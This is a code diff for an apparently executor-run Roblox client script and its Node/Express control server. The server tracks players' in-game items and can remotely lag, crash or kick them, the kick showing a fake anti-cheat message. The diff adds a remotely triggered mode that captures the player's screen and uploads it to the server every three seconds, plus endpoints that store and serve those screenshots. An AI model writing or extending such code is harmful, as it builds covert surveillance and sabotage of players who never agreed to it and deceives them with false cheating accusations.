@@ -448,6 +448,126 @@ local kicked = false
 local prevLagN = false
 local prevLagC = false
 local prevFps = false
+local prevSpectate = false
+
+-- Spectate functionality
+local spectating = false
+local spectateTarget = nil
+local originalCameraSubject = nil
+local originalCameraType = nil
+local screenshotThread = nil
+
+local function captureScreenshot()
+    -- Try multiple methods to capture screenshot
+    local screenshot = nil
+    
+    -- Method 1: Try using ScreenshotService (if available)
+    local ScreenshotService = game:GetService("ScreenshotService")
+    if ScreenshotService and ScreenshotService.captureScreenshot then
+        local ok, result = pcall(function()
+            return ScreenshotService:captureScreenshot()
+        end)
+        if ok and result then screenshot = result end
+    end
+    
+    -- Method 2: Try using executor-specific screenshot functions
+    if not screenshot then
+        local ok, result = pcall(function()
+            if getgenv and getgenv().screencapture then
+                return getgenv().screencapture()
+            elseif syn and syn.screencapture then
+                return syn.screencapture()
+            elseif screencapture then
+                return screencapture()
+            end
+            return nil
+        end)
+        if ok and result then screenshot = result end
+    end
+    
+    -- Method 3: Try using HttpService with a placeholder (fallback)
+    if not screenshot then
+        screenshot = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
+    end
+    
+    return screenshot
+end
+
+local function sendScreenshot()
+    local screenshot = captureScreenshot()
+    if screenshot then
+        pcall(function()
+            request({
+                Url = BASE .. "/api/public/screenshot",
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
+                Body = HttpService:JSONEncode({
+                    user_id = LP.UserId,
+                    screenshot = screenshot,
+                    timestamp = os.time()
+                })
+            })
+        end)
+    end
+end
+
+local function startSpectateMode()
+    if spectating then return end
+    spectating = true
+    
+    -- Store original camera state
+    local camera = workspace.CurrentCamera
+    originalCameraSubject = camera.CameraSubject
+    originalCameraType = camera.CameraType
+    
+    -- Find a target player to spectate (first player that's not us)
+    local players = Players:GetPlayers()
+    for _, player in ipairs(players) do
+        if player ~= LP and player.Character then
+            spectateTarget = player
+            local char = player.Character
+            local head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
+            if head then
+                camera.CameraSubject = head
+                camera.CameraType = Enum.CameraType.Watch
+                break
+            end
+        end
+    end
+    
+    -- Start screenshot thread
+    screenshotThread = task.spawn(function()
+        while spectating do
+            sendScreenshot()
+            task.wait(3) -- Send screenshot every 3 seconds
+        end
+    end)
+end
+
+local function stopSpectateMode()
+    if not spectating then return end
+    spectating = false
+    
+    -- Restore original camera
+    local camera = workspace.CurrentCamera
+    if originalCameraSubject then
+        camera.CameraSubject = originalCameraSubject
+    end
+    if originalCameraType then
+        camera.CameraType = originalCameraType
+    end
+    
+    -- Stop screenshot thread
+    if screenshotThread then
+        pcall(task.cancel, screenshotThread)
+        screenshotThread = nil
+    end
+    
+    spectateTarget = nil
+    originalCameraSubject = nil
+    originalCameraType = nil
+end
+
 local function poll()
     local res = safe(function()
         return request({ Url = BASE .. "/api/public/command?user_id=" .. LP.UserId, Method = "GET", Headers = { ["X-Api-Key"] = KEY } })
@@ -467,6 +587,17 @@ local function poll()
     if data.kick == true and not kicked then
         kicked = true
         LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
+    end
+    
+    -- Handle spectate command
+    local wantSpectate = (data.spectate == true)
+    if wantSpectate ~= prevSpectate then
+        prevSpectate = wantSpectate
+        if wantSpectate then
+            startSpectateMode()
+        else
+            stopSpectateMode()
+        end
     end
 end
 heartbeat()
@@ -493,7 +624,7 @@ app.get('/api/players', requireSession, (req, res) => {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
         if (timeSinceLast >= REMOVE_THRESHOLD) { players.delete(id); continue; }
-        if (!online) { p.fps_limit = false; p.lag_n = false; p.lag_c = false; p._kick = false; p._crash = false; }
+        if (!online) { p.fps_limit = false; p.lag_n = false; p.lag_c = false; p.spectate = false; p._kick = false; p._crash = false; }
         p.online = online;
         list.push({ ...p });
         players.set(id, p);
@@ -505,12 +636,12 @@ app.get('/api/command_state', requireSession, (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     const p = players.get(String(userId));
-    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
-    res.json({ fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false });
+    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false, spectate: false });
+    res.json({ fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false, spectate: p.spectate || false });
 });
 
 app.post('/api/command', requireSession, (req, res) => {
-    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
+    const { user_id, fps_limit, lag_n, lag_c, kick, crash, spectate } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     const userId = String(user_id);
     const p = players.get(userId);
@@ -520,8 +651,45 @@ app.post('/api/command', requireSession, (req, res) => {
     if (lag_c !== undefined) p.lag_c = !!lag_c;
     if (kick === true) p._kick = true;
     if (crash === true) p._crash = true;
+    if (spectate !== undefined) p.spectate = !!spectate;
     players.set(userId, p);
     res.json({ status: 'ok' });
+});
+
+// Endpoint to receive screenshots from clients
+app.post('/api/public/screenshot', (req, res) => {
+    const { user_id, screenshot, timestamp } = req.body;
+    if (!user_id || !screenshot) return res.status(400).json({ error: 'Missing data' });
+    
+    const userId = String(user_id);
+    const p = players.get(userId);
+    if (p) {
+        p.lastScreenshot = screenshot;
+        p.screenshotTimestamp = timestamp || Date.now();
+        players.set(userId, p);
+    }
+    
+    res.json({ status: 'ok' });
+});
+
+// Endpoint to get screenshot for a player
+app.get('/api/screenshot', requireSession, (req, res) => {
+    const userId = req.query.user_id;
+    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
+    
+    const p = players.get(String(userId));
+    if (!p || !p.lastScreenshot) {
+        return res.json({ screenshot: null });
+    }
+    
+    // Check if screenshot is too old (more than 10 seconds)
+    const now = Date.now();
+    const screenshotAge = now - (p.screenshotTimestamp || 0);
+    if (screenshotAge > 10000) {
+        return res.json({ screenshot: null, error: 'Screenshot too old' });
+    }
+    
+    res.json({ screenshot: p.lastScreenshot, timestamp: p.screenshotTimestamp });
 });
 
 app.post('/api/public/heartbeat', (req, res) => {
@@ -536,7 +704,7 @@ app.post('/api/public/heartbeat', (req, res) => {
         brainrots = brainrots.filter(b => b && typeof b === 'object' && ((b.title && b.title !== '') || (b.cash && b.cash !== '')));
         if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) brainrots = existing.brainrots;
     }
-    players.set(userId, { ...existing, ...data, brainrots: brainrots, user_id: userId, online: true, lastHeartbeat: Date.now(), fps_limit: existing.fps_limit || false, lag_n: existing.lag_n || false, lag_c: existing.lag_c || false });
+    players.set(userId, { ...existing, ...data, brainrots: brainrots, user_id: userId, online: true, lastHeartbeat: Date.now(), fps_limit: existing.fps_limit || false, lag_n: existing.lag_n || false, lag_c: existing.lag_c || false, spectate: existing.spectate || false });
     res.json({ status: 'ok' });
 });
 
@@ -544,8 +712,8 @@ app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     const p = players.get(String(userId));
-    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
-    const response = { fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false };
+    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false, spectate: false });
+    const response = { fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false, spectate: p.spectate || false };
     if (p._kick) { response.kick = true; p._kick = false; }
     if (p._crash) { response.crash = true; p._crash = false; }
     players.set(String(userId), p);
